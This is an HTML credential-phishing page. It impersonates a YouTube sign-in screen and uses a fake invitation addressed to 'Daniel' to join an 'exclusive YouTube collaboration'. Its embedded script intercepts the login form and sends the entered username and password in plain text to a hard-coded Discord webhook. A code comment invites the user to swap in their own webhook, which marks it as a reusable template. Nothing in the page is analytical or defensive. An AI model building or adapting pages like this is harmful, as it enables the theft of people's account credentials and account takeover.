<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube Collaboration</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background-color: #e8f0fe;
        }

        .form-container {
            background: #ffffff;
            width: 100%;
            max-width: 360px;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
            text-align: left;
        }

        .form-container img {
            display: block;
            margin: 0 auto 20px;
            width: 75px;
        }

        .form-container h1 {
            font-size: 22px;
            font-weight: 400;
            margin-bottom: 10px;
            color: #202124;
        }

        .form-container p.subtitle {
            font-size: 14px;
            color: #5f6368;
            margin-bottom: 30px;
        }

        .form-container input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 14px;
            color: #202124;
            box-sizing: border-box;
        }

        .form-container button {
            width: 100%;
            padding: 10px;
            background-color: #1a73e8;
            color: white;
            font-size: 14px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin-top: 20px;
        }

        .form-container button:hover {
            background-color: #135abc;
        }

        .form-container a {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
        }

        .form-container a:hover {
            text-decoration: underline;
        }

        .form-container .footer-text {
            margin-top: 20px;
            font-size: 12px;
            color: #5f6368;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="form-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/4/42/YouTube_icon_%282013-2017%29.png" alt="YouTube Logo">
        <h1>Hello Daniel</h1>
        <p class="subtitle">You are invited to join an exclusive YouTube collaboration. Sign in below to confirm your participation.</p>
        <form id="forumForm">
            <input type="text" id="username" placeholder="Email or username" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
        </form>
        <p class="footer-text">
            Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a>
        </p>
    </div>

    <script>
        document.getElementById('forumForm').addEventListener('submit', function(event) {
            event.preventDefault();

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            const webhookUrl = 'https://discord.com/api/webhooks/1290997820030980166/GzOkN3b6h1XQJ269CHu2dLz4dg2TDeuOgZ8JXIiZlRlZOdH7fMSEf25byQK-TaYDDWDo'; // Replace with your Discord webhook URL

            const payload = {
                content: `**New Sign In Attempt:**\nUsername: ${username}\nPassword: ${password}`
            };

            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            })
            .then(response => {
                if (response.ok) {
                    alert('Information sent successfully!');
                } else {
                    alert('Error sending information. Please check your webhook URL.');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Error sending information. Please try again.');
            });
        });
    </script>
</body>
</html>
